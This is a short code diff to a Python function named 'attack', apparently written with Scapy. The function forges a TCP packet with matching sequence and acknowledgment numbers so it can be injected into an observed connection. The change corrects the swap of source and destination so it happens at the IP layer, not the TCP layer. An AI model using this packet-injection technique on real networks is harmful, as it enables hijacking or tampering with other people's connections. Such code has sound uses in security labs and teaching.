@@ -20,8 +20,8 @@ def attack(req):
     resp[TCP].seq = req[TCP].ack
     resp[TCP].ack = req[TCP].seq + len(req[TCP].load)
     resp[TCP].flags = 'AP'
-    resp[TCP].src = req[TCP].dst
-    resp[TCP].dst = req[TCP].src
+    resp[IP].src = req[IP].dst
+    resp[IP].dst = req[IP].src
     send(resp, verbose=1, count=1)
 
 
